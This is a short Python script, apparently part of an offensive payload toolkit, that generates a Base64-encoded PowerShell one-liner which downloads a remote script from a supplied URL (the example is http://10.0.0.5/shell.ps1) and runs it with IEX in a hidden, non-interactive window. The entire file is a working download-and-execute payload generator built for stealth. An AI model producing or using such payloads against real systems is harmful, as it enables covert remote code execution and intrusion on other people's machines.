#!/usr/bin/env python3
"""
powershell_one_liner.py - Generate a Base64-encoded PowerShell download/execution one-liner

Example:
  python3 scripts/payloads/powershell_one_liner.py --url http://10.0.0.5/shell.ps1
"""
from __future__ import annotations
import argparse
import base64
import sys

GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
NC = "\033[0m"


def main() -> int:
    p = argparse.ArgumentParser(description='Generate encoded PowerShell one-liner')
    p.add_argument('--url', required=True)
    args = p.parse_args()

    ps = f"IEX(New-Object Net.WebClient).DownloadString('{args.url}')"
    enc = base64.b64encode(ps.encode('utf-16le')).decode()
    one = f"powershell -NoP -NonI -W Hidden -Enc {enc}"
    print(f"{GREEN}PowerShell one-liner:{NC}\n{one}", flush=True)
    return 0


if __name__ == '__main__':
    sys.exit(main())
